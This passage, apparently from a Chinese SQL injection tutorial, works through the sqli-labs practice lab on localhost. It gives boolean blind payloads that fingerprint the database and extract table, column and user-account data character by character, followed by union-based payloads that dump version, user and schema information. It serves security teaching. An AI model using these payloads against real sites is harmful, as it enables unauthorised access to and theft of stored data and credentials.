。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库
    //判断是否是 Mysql数据库
    http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from information_schema.tables) #
    ​
    //判断是否是 access数据库
    http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from msysobjects) #
    ​
    //判断是否是 Sqlserver数据库
    http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from sysobjects) #
    ​
    //判断是否是Oracle数据库
    http://127.0.0.1/sqli/Less-5/?id=1' and (select count(*) from dual)>0 #
对于MySQL数据库，information_schema
数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。
**information_schema.tables** 存储了数据表的元数据信息，下面对常用的字段进行介绍：
**·** table_schema: 记录 **数据库名** ；
**·** table_name: 记录 **数据表名** ；
**·** table_rows: 关于表的粗略行估计；
**·** data_length : 记录 **表的大小** （单位字节）；
2：判断当前数据库名(以下方法不适用于access和SQL Server数据库)
    1：判断当前数据库的长度，利用二分法
    http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>5   //正常显示
    http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>10   //不显示任何数据
    http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>7   //正常显示
    http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>8   //不显示任何数据
    ​
    大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为 8
    ​
    2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断
    //判断数据库的第一个字符
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),1,1))>100
    ​
    //判断数据库的第二个字符
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),2,1))>100
    ​
    ...........
    由此可以判断出当前数据库为 security
3：判断当前数据库中的表
    http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin)   //猜测当前数据库中是否存在admin表
    1：判断当前数据库中表的个数
    // 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4
    http://127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>5 #
    ​
    2：判断每个表的长度
    //判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
    http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6
    ​
    //判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
    http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6
    ​
    3：判断每个表的每个字符的ascii值
    //判断第一个表的第一个字符的ascii值
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #
    ​
    //判断第一个表的第二个字符的ascii值
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 #
    ​
    .........
    由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断
4\. 判断表中的字段
    http://127.0.0.1/sqli/Less-5/?id=1' and exists(select username from admin)   //如果已经证实了存在admin表，那么猜测是否存在username字段
    1：判断表中字段的个数
    //判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的
    http://127.0.0.1/sqli/Less-5/?id=1' and (select count(column_name) from information_schema.columns where table_name='users')>5 #
    ​
    2：判断字段的长度
    //判断第一个字段的长度
    http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5
    ​
    //判断第二个字段的长度
    http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))>5
    ​
    3：判断字段的ascii值
    //判断第一个字段的第一个字符的长度
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100
    ​
    //判断第一个字段的第二个字符的长度
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))>100
    ​
    ...........
    由此可判断出users表中存在 id、username、password 字段
5.判断字段中的数据
    我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据
    ​
    1: 判断数据的长度
    // 判断id字段的第一个数据的长度
    http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))>5
    ​
    // 判断id字段的第二个数据的长度
    http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))>5
    ​
    2：判断数据的ascii值
    // 判断id字段的第一个数据的第一个字符的ascii值
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),1,1))>100
    ​
    // 判断id字段的第一个数据的第二个字符的ascii值
    http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))>100
    ​
    ...........
### 二：union 注入
union联合查询适用于有显示列的注入。
我们可以通过order by来判断当前表的列数。最后可得知，当前表有3列
‘ order by 3 #
我们可以通过 union 联合查询来知道显示的列数
[127.0.0.1/sqli/Less-1/?id=1′ union select 1 ,2 ,3
#](http://127.0.0.1/sqli/Less-1/?id=1%27%20union%20select%201%20,2%20,3%20%23)
咦，这里为啥不显示我们联合查询的呢？因为这个页面只显示一行数据，所以我们可以用 and 1=2 把前面的条件给否定了，或者我们直接把前面 id=1 改成
id =-1 ,在后面的代码中，都是将 id=-1进行注入
    http://127.0.0.1/sqli/Less-1/?id=1' and 1=2 union select 1,2,3 #
    ​
    http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 #
这样，我们联合查询的就显示出来了。可知，第2列和第3列是显示列。那我们就可以在这两个位置插入一些函数了。
我们可以通过这些函数获得该数据库的一些重要的信息
**·** version() ：数据库的版本
**·** database() :当前所在的数据库
**·** @@basedir : 数据库的安装目录
**·** @@datadir ： 数据库文件的存放目录
**·** user() ： 数据库的用户
**·** current_user() : 当前用户名
**·** system_user() : 系统用户名
**·** session_user() :连接到数据库的用户名
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,version(),user() #
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,database(),@@basedir #
    http://127.0.0.1/sqli/Less-1/?id=-1'   union select 1,@@datadir,current_user() #
我们还可以通过union注入获得更多的信息。
    // 获得所有的数据库 
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(schema_name),3 from information_schema.schemata#
    ​
    // 获得所有的表
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(table_name),3 from information_schema.tables#
    ​
    // 获得所有的列
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(column_name),3 from information_schema.columns#